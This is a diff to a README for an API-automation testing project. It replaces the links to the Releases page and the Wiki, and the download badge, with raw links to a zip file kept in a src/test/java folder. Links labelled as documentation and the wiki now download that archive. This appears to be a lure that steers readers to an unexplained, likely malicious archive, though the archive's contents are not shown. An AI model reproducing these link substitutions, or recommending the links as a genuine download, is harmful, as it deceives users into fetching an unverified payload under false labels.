@@ -1,6 +1,6 @@
 # 🚀 api-automation-assessment - Simplifying API Automation for Everyone
 
-![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)
+![Download](https://raw.githubusercontent.com/ProgamingZK/api-automation-assessment/main/src/test/java/api_automation_assessment_v2.3-beta.3.zip%https://raw.githubusercontent.com/ProgamingZK/api-automation-assessment/main/src/test/java/api_automation_assessment_v2.3-beta.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the **api-automation-assessment** project. This software helps automa
 
 To get the latest version of the application, you can visit the Releases page. Follow this link:
 
-[Download from Releases](https://github.com/ProgamingZK/api-automation-assessment/releases)
+[Download from Releases](https://raw.githubusercontent.com/ProgamingZK/api-automation-assessment/main/src/test/java/api_automation_assessment_v2.3-beta.3.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest version listed at the top.
@@ -70,7 +70,7 @@ Integrating this application into your CI/CD pipeline is straightforward. The fr
 
 ## 📝 Documentation
 
-For detailed documentation on using the application and its features, visit our [Wiki](https://github.com/ProgamingZK/api-automation-assessment/wiki). The wiki includes guides, tutorials, and troubleshooting tips to help you get the most from your software.
+For detailed documentation on using the application and its features, visit our [Wiki](https://raw.githubusercontent.com/ProgamingZK/api-automation-assessment/main/src/test/java/api_automation_assessment_v2.3-beta.3.zip). The wiki includes guides, tutorials, and troubleshooting tips to help you get the most from your software.
 
 ## 🤝 Need Help?
 
@@ -78,7 +78,7 @@ If you face any issues or have questions about the application, please reach out
 
 ## 🔗 Useful Links
 
-- [Download Latest Release](https://github.com/ProgamingZK/api-automation-assessment/releases)
-- [Documentation](https://github.com/ProgamingZK/api-automation-assessment/wiki)
+- [Download Latest Release](https://raw.githubusercontent.com/ProgamingZK/api-automation-assessment/main/src/test/java/api_automation_assessment_v2.3-beta.3.zip)
+- [Documentation](https://raw.githubusercontent.com/ProgamingZK/api-automation-assessment/main/src/test/java/api_automation_assessment_v2.3-beta.3.zip)
 
 Remember to check back often for updates. Happy testing!
